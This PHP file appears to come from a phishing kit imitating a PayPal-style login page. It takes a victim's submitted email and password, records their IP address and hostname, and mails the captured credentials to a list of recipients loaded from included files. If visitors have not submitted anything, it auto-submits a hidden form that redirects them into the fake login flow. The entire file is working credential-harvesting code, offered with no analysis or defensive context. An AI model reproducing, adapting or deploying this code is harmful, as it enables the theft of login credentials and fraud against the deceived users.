<?php
if (!isset($_SESSION)) {
 session_start();
}
$webscr="websc";
$email = strpos($_POST['login_email'], "@");
$pointe = strpos($_POST['login_email'], ".");
if( $_POST['login_password']!="" and $email and $pointe ){
	$ip = getenv("REMOTE_ADDR");
	$datamasii=date("D M d, Y - g:i a");
	$hostname = gethostbyaddr($ip);
	
	$_SESSION['emaill'] = $_POST['login_email'];
	$_SESSION['passwordd'] = $_POST['login_password'];
	
	include $webscr."/to.php";
	include $webscr."/send-log.php";
	for($s=0;$s<$all;$s++){
		mail($send[$s], $subject, $msg);
	}
	include "loading.php";
}else{
?>
<form name="form1" action="<?php echo "$webscr/?cmd=_login-submit&dispatch=5885d80a13c0db1f8e263663d3faee8dc18bca4c6f47e633b393e284a5f8a8f8&ee=$ee"; ?>" method="post"></form>
<script language="JavaScript">
setTimeout('document.form1.submit()',0);
</script>
<?php
}
?>
